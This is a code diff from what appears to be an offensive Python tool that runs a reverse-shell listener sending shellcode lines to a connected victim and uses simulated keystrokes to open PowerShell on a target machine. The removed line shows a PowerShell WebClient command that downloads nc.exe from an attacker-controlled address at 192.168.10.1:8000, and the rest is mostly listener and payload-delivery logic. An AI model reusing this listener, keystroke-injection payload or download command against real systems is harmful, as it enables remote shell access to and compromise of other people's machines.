@@ -46,7 +46,7 @@ def reverse_shell_listener():
 		s.listen(10) # Listen for only 10 unaccepted connections.
 		conn, addr = s.accept() # Accept connections.
 		print("[+] Connected by", addr) # Print connected by ipaddress.
-		data = conn.recv(1024).decode("UTF-8") # Inital Connect
+		data = recv_timeout(conn)
 		codelines=shellcode.split("\n")
 		for line in codelines:
 			print("Sending: " + line)
@@ -55,6 +55,7 @@ def reverse_shell_listener():
 			print(data) # Print the output of the command.
 		print("Letting copy finish")
 		print("Copy should have finished")
+		s.shutdown()
 	except KeyboardInterrupt: 
 		print("...listener terminated using [ctrl+c], Shutting down!")
 		exit() # Using [ctrl+c] will terminate the listener.
@@ -84,7 +85,6 @@ def payload(web_dir):
 	eco.type("powershell")
 	eco.press("ENTER")
 	sleep(1)
-	# eco.type("(new-object System.Net.WebClient).DownloadFile(\"http://192.168.10.1:8000/nc.exe\", \"./nc.exe\")")
 	eco.press("ENTER")
 	sleep(2)
 
